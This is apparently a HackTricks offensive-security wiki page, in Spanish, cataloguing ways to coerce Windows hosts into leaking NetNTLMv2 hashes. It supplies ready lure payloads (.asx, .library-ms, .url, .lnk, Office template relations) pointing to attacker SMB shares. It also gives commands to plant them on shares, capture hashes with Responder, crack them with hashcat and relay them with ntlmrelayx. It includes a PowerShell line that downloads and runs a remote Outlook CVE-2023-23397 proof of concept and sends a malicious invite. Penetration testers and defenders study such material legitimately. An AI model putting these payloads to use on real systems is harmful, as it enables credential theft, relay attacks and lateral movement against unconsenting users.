# Lugares para robar credenciales NTLM

{{#include ../../banners/hacktricks-training.md}}

**Consulta todas las grandes ideas de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) desde la descarga de un archivo de Microsoft Word online hasta la fuente de filtraciones de ntlm: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md y [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Si puedes **escribir en un share que los usuarios o tareas programadas abren en Explorer**, deja archivos cuyos metadatos apunten a tu UNC (p. ej., `\\ATTACKER\share`). Al renderizar la carpeta se desencadena **autenticación SMB implícita** y se filtra un **NetNTLMv2** a tu listener.

1. **Genera lures** (cubre SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Déjalos en el recurso compartido escribible** (cualquier carpeta que la víctima abra):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Escuchar y crackear**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows puede acceder a varios archivos a la vez; cualquier cosa que Explorer previsualiza (`BROWSE TO FOLDER`) no requiere clics.

### Windows Media Player playlists (.ASX/.WAX)

Si consigues que un objetivo abra o previsualice una playlist de Windows Media Player que controlas, puedes leak Net‑NTLMv2 apuntando la entrada a un path UNC. WMP intentará obtener el medio referenciado a través de SMB y se autenticará de forma implícita.

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Flujo de recolección y cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer maneja de forma insegura los archivos .library-ms cuando se abren directamente desde dentro de un archivo ZIP. Si la definición de la biblioteca apunta a una ruta UNC remota (p. ej., \\attacker\share), simplemente navegar/abrir el .library-ms dentro del ZIP hace que Explorer enumere la UNC y emita autenticación NTLM al atacante. Esto proporciona un NetNTLMv2 que puede ser crackeado offline o potencialmente relayado.

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Pasos operativos
- Crea el archivo .library-ms con el XML anterior (configura tu IP/hostname).
- Comprímelo en ZIP (en Windows: Enviar a → Carpeta comprimida (zip)) y entrega el ZIP al objetivo.
- Ejecuta un listener de captura NTLM y espera a que la víctima abra el .library-ms desde dentro del ZIP.


### Ruta del sonido de recordatorio del calendario de Outlook (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows procesaba la propiedad MAPI extendida PidLidReminderFileParameter en los elementos del calendario. Si esa propiedad apunta a una ruta UNC (p. ej., \\attacker\share\alert.wav), Outlook contactará con el SMB share cuando se active el recordatorio, filtrando el Net‑NTLMv2 del usuario sin ningún clic. Esto se corrigió el 14 de marzo de 2023, pero sigue siendo muy relevante para flotas legacy/sin parche y para incident response histórico.

Explotación rápida con PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Lado del listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notas
- Una víctima solo necesita tener Outlook for Windows ejecutándose cuando se active el recordatorio.
- El leak genera Net‑NTLMv2 adecuado para cracking offline o relay (no para pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer renderiza los iconos de los accesos directos automáticamente. Investigaciones recientes mostraron que incluso después del parche de Microsoft de abril de 2025 para accesos directos con iconos UNC, todavía era posible desencadenar autenticación NTLM sin clics alojando el destino del acceso directo en una ruta UNC y manteniendo el icono local (se asignó al bypass del parche CVE‑2025‑50154). Con solo ver la carpeta, Explorer recupera metadatos del destino remoto, emitiendo NTLM al servidor SMB del atacante.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload de acceso directo del programa (.lnk) vía PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Ideas de entrega
- Drop the shortcut en un ZIP y consigue que la víctima lo abra.
- Coloca el shortcut en una share escribible que la víctima vaya a abrir.
- Combínalo con otros lure files en la misma carpeta para que Explorer previsualice los elementos.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows carga metadata de `.lnk` durante **view/preview** (renderizado de icono), no solo al ejecutarse. CVE‑2026‑25185 muestra una ruta de parsing donde bloques **ExtraData** hacen que el shell resuelva una ruta de icono y toque el filesystem **durante load**, emitiendo NTLM saliente cuando la ruta es remote.

Condiciones clave de trigger (observadas en `CShellLink::_LoadFromStream`):
- Incluye **DARWIN_PROPS** (`0xa0000006`) en ExtraData (gate to icon update routine).
- Incluye **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) con **TargetUnicode** poblado.
- El loader expande las environment variables en `TargetUnicode` y llama a `PathFileExistsW` sobre la ruta resultante.

Si `TargetUnicode` resuelve a una UNC path (por ejemplo, `\\attacker\share\icon.ico`), **simplemente al ver una carpeta** que contenga el shortcut se provoca authentication saliente. La misma ruta de load también puede activarse mediante **indexing** y **AV scanning**, lo que lo convierte en una superficie de leak no-click práctica.

Hay tooling de research (parser/generator/UI) disponible en el proyecto **LnkMeMaybe** para construir/inspeccionar estas estructuras sin usar la GUI de Windows.


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

El cliente nativo **WebDAV** puede abusarse para forzar a la current logon session a authenticate a un endpoint arbitrario **HTTP/WebDAV**:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Por qué esto es útil:
- Contra un **servidor WebDAV controlado por el atacante**, puede desencadenar **NTLM over HTTP** sin desplegar un cliente personalizado.
- Contra **hosts internos**, es una forma silenciosa de **validar dónde se aceptan las credenciales robadas** antes de moverse lateralmente.
- El comando es una buena alternativa cuando el **egress SMB** está filtrado pero **HTTP/WebDAV** sigue siendo accesible.

Notas operativas:
- El servicio **WebClient** debe estar ejecutándose en el host de origen.
- `rundll32.exe` carga `davclnt.dll` y hace que Windows maneje la autenticación WebDAV usando las **credenciales del usuario actual**.
- Si lo apuntas a una infraestructura que controlas, usa un listener/relay HTTP compatible con NTLM como:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Desde una perspectiva de detección, las ejecuciones repetidas de `rundll32.exe davclnt.dll,DavSetCookie` contra muchos sistemas internos son una señal fuerte de **credential validation / preparación de movimiento lateral tipo spray** más que de comportamiento normal de un usuario.

### Office remote template injection (.docx/.dotm) para forzar NTLM

Los documentos de Office pueden referenciar una plantilla externa. Si configuras la plantilla adjunta a una ruta UNC, al abrir el documento se autenticará a SMB.

Cambios mínimos de relaciones de DOCX (dentro de word/):

1) Edita word/settings.xml y añade la referencia de plantilla adjunta:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Edit word/_rels/settings.xml.rels y apunta rId1337 a tu UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Reempaqueta a .docx y entrégalo. Ejecuta tu SMB capture listener y espera a que se abra.

Para ideas posteriores al capture sobre relaying o abusing NTLM, revisa:

{{#ref}}
README.md
{{#endref}}


## References
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE-2025-24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
